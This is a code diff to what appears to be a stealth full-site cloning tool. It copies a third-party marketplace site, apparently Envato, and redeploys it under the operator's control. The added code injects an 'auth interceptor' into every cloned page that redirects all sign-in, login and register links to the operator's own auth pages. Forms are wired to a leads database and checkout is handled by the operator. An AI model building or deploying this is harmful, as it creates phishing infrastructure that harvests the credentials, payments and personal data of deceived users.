@@ -3,7 +3,8 @@ import { secrets } from 'base44:runtime';
 import { createStealthSession, releaseSession, CDPClient, crawlSiteStealth } from '../../shared/stealthBrowser.ts';
 import { clonePageAssets, rewriteInternalLinks, pathToFilename, buildSearchScript, buildStripeCheckoutScript, buildSupabaseFormScript, buildCatalogScript, buildFormHandlerScript } from '../../shared/fullSiteClone.ts';
 import { slugify, createVercelProject, disableVercelSso, deployToVercelMultiFile, createDriveFolder, createGitHubRepo, pushGitHubFile, createSupabaseProject } from '../../shared/launchInfra.ts';
-import { buildAllAiToolPages, rewriteAiToolLinks, AI_TOOLS, buildAiToolsSidebarScript, buildAiLinkInterceptorScript } from '../../shared/aiToolPages.ts';
+import { buildAllAiToolPages, rewriteAiToolLinks, AI_TOOLS, buildAiToolsSidebarScript, buildAiLinkInterceptorScript, buildAllCategoryPages, CATEGORY_PAGES } from '../../shared/aiToolPages.ts';
+import { buildAuthInterceptorScript } from '../../shared/fullSiteClone.ts';
 
 // Autonomous full-site clone engine — sitemap-driven (not BFS), so it discovers
 // ALL pages upfront and clones every one. Handles 100+ pages in a single run by
@@ -369,6 +370,14 @@ export default async function(req: Request) {
     const aiLinkInterceptor = buildAiLinkInterceptorScript();
     const aiToolPages = buildAllAiToolPages(invokeAiUrl, checkoutUrl);
 
+    // Auth interceptor — redirect all sign-in/login/register links to my auth pages
+    const myLoginUrl = `https://fault-line.base44.app/autoleads/login`;
+    const myRegisterUrl = `https://fault-line.base44.app/autoleads/register`;
+    const authInterceptorScript = buildAuthInterceptorScript(myLoginUrl, myRegisterUrl);
+
+    // Category pages — dedicated pages for each Envato category (replaces 404 fallback)
+    const categoryPages = buildAllCategoryPages(catalogApiUrl, checkoutUrl, myLoginUrl, myRegisterUrl);
+
     // Supabase form backend — wire all forms to the IBEAM Supabase leads table
     const ibeamSupabaseUrl = secrets.get('IBEAM_SUPABASE_URL');
     const ibeamSupabaseAnonKey = secrets.get('IBEAM_SUPABASE_ANON_KEY');
@@ -380,13 +389,25 @@ export default async function(req: Request) {
     for (const meta of pageMetadata) {
       let html = new TextDecoder().decode(fileMap.get(meta.filename)!);
       html = rewriteAiToolLinks(html);
-      const inject = searchScript + '\n' + catalogScript + '\n' + checkoutScript + '\n' + aiSidebarScript + '\n' + aiLinkInterceptor + (supabaseFormScript ? '\n' + supabaseFormScript : '');
+      const inject = searchScript + '\n' + catalogScript + '\n' + checkoutScript + '\n' + aiSidebarScript + '\n' + aiLinkInterceptor + '\n' + authInterceptorScript + (supabaseFormScript ? '\n' + supabaseFormScript : '');
       if (html.includes('</body>')) {
         html = html.replace('</body>', inject + '\n</body>');
       } else {
         html += inject;
       }
       fileMap.set(meta.filename, new TextEncoder().encode(html));
+    }
+
+    // Add category pages (dedicated pages for each Envato category)
+    for (const [filename, html] of categoryPages) {
+      const slug = filename.replace(/\.html$/, '');
+      pageMetadata.push({
+        filename, path: '/' + slug,
+        title: CATEGORY_PAGES.find(c => c.slug === slug)?.title || slug,
+        headings: [], images_rehosted: 0,
+      });
+      fileMap.set(filename, new TextEncoder().encode(html));
+      linkMap.set('/' + slug, '/' + filename);
     }
 
     // Add AI tool pages
